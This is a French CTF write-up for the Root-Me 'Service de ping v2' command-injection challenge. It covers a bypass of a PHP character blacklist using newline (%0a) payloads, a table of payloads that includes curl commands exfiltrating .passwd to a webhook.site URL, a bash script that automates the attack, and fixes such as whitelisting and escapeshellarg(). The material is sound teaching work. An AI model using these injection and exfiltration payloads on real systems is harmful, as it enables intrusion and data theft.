# 📄 Write-up : Command Injection - Filter Bypass (Root-Me Challenge)

**Auteur** : [exploit4040](https://github.com/exploit4040)  
**Challenge** : Root-Me — Service de ping v2 (`ch53`)  
**Niveau** : Intermédiaire  
**Date** : 23/04/2026  
**Objectif** : Lire le fichier `.passwd` via une injection de commande malgré un filtre WAF.

---

## 📌 Table des matières

1. [Description du challenge](#1-description-du-challenge)
2. [Analyse du filtre](#2-analyse-du-filtre)
3. [Exploitation pas à pas](#3-exploitation-pas-à-pas)
4. [Payloads utilisés](#4-payloads-utilisés)
5. [Code source vulnérable](#5-code-source-vulnérable)
6. [Fix & Recommandations](#6-fix--recommandations)
7. [Références](#7-références)
8. [Bonus : Script automatisé](#-bonus--script-dexploitation-automatisé)

---

## 1. Description du challenge

Le service permet d'effectuer un `ping` vers une adresse IP saisie par l'utilisateur.

- **Version 1** → vulnérable à une simple injection (ex : `; ls`)
- **Version 2** → un **filtre de caractères dangereux** est ajouté

**But** : contourner ce filtre et lire le fichier `.passwd` contenant le flag.

---

## 2. Analyse du filtre

D'après le code source PHP récupéré :

```php
$ip = @preg_replace("/[\\\$|`;&<>]/", "", $_POST["ip"]);
```

### ❌ Caractères filtrés (blacklist)

| Caractère | Nom         |
|-----------|-------------|
| `\`       | backslash   |
| `$`       | dollar      |
| `\|`      | pipe        |
| `` ` ``   | backtick    |
| `;`       | point-virgule |
| `&`       | esperluette |
| `<`       | inférieur   |
| `>`       | supérieur   |

### ✅ Caractères **non filtrés** (exploitables)

| Caractère / Valeur  | Utilisation                  |
|---------------------|------------------------------|
| `%0a` (newline)     | Séparateur de commandes      |
| `%20` ou espace     | Séparateur d'arguments       |
| `%09` (tab)         | Alternatif à l'espace        |
| `cat`, `curl`, `base64` | Commandes système       |
| `.`                 | Accès aux fichiers cachés    |

> 💡 **Le saut de ligne `%0a` est la clé** — il n'est pas filtré et permet de chaîner des commandes shell.

---

## 3. Exploitation pas à pas

### Étape 1 — Tester l'injection basique

```
1.1.1.1%0awhoami
```

**Résultat** : La commande s'exécute. L'injection fonctionne.

---

### Étape 2 — Lire `index.php` pour comprendre la structure

```
1.1.1.1%0acat%20index.php
```

On découvre que le flag est lu depuis `.passwd` :

```php
$flag = file_get_contents(".passwd");
```

---

### Étape 3 — Lire `.passwd` directement

```
1.1.1.1%0acat%20.passwd
```

**Résultat** : ✅ Le flag s'affiche dans la réponse de la page.

---

## 4. Payloads utilisés

| Objectif                | Payload                                                                 |
|-------------------------|-------------------------------------------------------------------------|
| Test de base            | `1.1.1.1%0aid`                                                          |
| Lire un fichier         | `1.1.1.1%0acat%20index.php`                                             |
| Lire fichier caché      | `1.1.1.1%0acat%20.passwd`                                               |
| Bypass espace (tab)     | `1.1.1.1%0acat%09.passwd`                                               |
| Exfiltration webhook    | `1.1.1.1%0acurl%20-X%20POST%20--data-binary%20@.passwd%20http://webhook.site/xxx` |
| Exfiltration base64     | `1.1.1.1%0abase64%20.passwd%20\|%20curl%20-X%20POST%20--data-binary%20@-%20http://webhook.site/xxx` |

---

## 5. Code source vulnérable

```php
<?php
$flag = file_get_contents(".passwd");

if(isset($_POST["ip"]) && !empty($_POST["ip"])){
    $ip = @preg_replace("/[\\\$|`;&<>]/", "", $_POST["ip"]);
    $response = @shell_exec("timeout 5 bash -c 'ping -c 3 ".$ip."'");
    $receive = @preg_match("/3 packets transmitted, (.*) received/s", $response, $out);

    if ($out[1] == "3")
        echo "Ping OK";
    elseif ($out[1] == "0")
        echo "Ping NOK";
    else
        echo "Syntax Error";
}
?>
```

### 🔍 Pourquoi c'est vulnérable ?

- `preg_replace()` **supprime** certains caractères mais ne bloque pas l'exécution.
- Le caractère `%0a` (newline) n'est **pas dans la blacklist**.
- L'entrée utilisateur est **concaténée directement** dans `shell_exec()` → injection triviale.

---

## 6. Fix & Recommandations

### ❌ Ce qu'il ne faut pas faire

```php
// Blacklist incomplète — contournable
$ip = preg_replace("/[\\\$|`;&<>]/", "", $_POST["ip"]);
```

### ✅ Solutions robustes

**1. Whitelist stricte (IP uniquement)**

```php
if (!preg_match('/^[0-9.]+$/', $_POST["ip"])) {
    die("Invalid input");
}
```

**2. Utiliser `escapeshellarg()`**

```php
$ip = escapeshellarg($_POST["ip"]);
$response = shell_exec("ping -c 3 $ip");
```

**3. Valider avec `FILTER_VALIDATE_IP`**

```php
if (!filter_var($_POST["ip"], FILTER_VALIDATE_IP)) {
    die("Invalid IP address");
}
```

> 🔐 La **whitelist** combinée à `escapeshellarg()` est la meilleure approche.

---

## 7. Références

- [OWASP — Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- [Root-Me — Service de ping v2 (ch53)](https://www.root-me.org/fr/Challenges/Web-Serveur/Injection-de-commande-Contournement-de-filtre)
- [PayloadsAllTheThings — Command Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)

---

## 🔧 Bonus : Script d'exploitation automatisé

```bash
#!/bin/bash
# exploit.sh — Automatisation Root-Me ch53 (Command Injection Filter Bypass)
# Auteur : exploit4040

URL="http://challenge01.root-me.org/web-serveur/ch53/index.php"
PAYLOAD="1.1.1.1%0acat%20.passwd"

echo "[*] Envoi du payload..."
RESULT=$(curl -s -X POST "$URL" -d "ip=$PAYLOAD")

echo "[*] Réponse brute :"
echo "$RESULT"

# Tentative d'extraction du flag
FLAG=$(echo "$RESULT" | grep -oP '[a-zA-Z0-9]{20,}')
if [ -n "$FLAG" ]; then
    echo -e "\n[+] FLAG potentiel : $FLAG"
else
    echo -e "\n[-] Flag non trouvé automatiquement. Vérifier la réponse brute."
fi
```

---

## 📜 Disclaimer

> Ce write-up est fourni à des fins **éducatives uniquement**.  
> N'utilisez ces techniques que sur des systèmes que vous possédez ou avec une **autorisation explicite**.  
> L'auteur décline toute responsabilité en cas d'utilisation malveillante.

---

**Auteur** : [exploit4040](https://github.com/exploit4040) — Follow pour plus de write-ups CTF & recherches en cybersécurité. ⚡
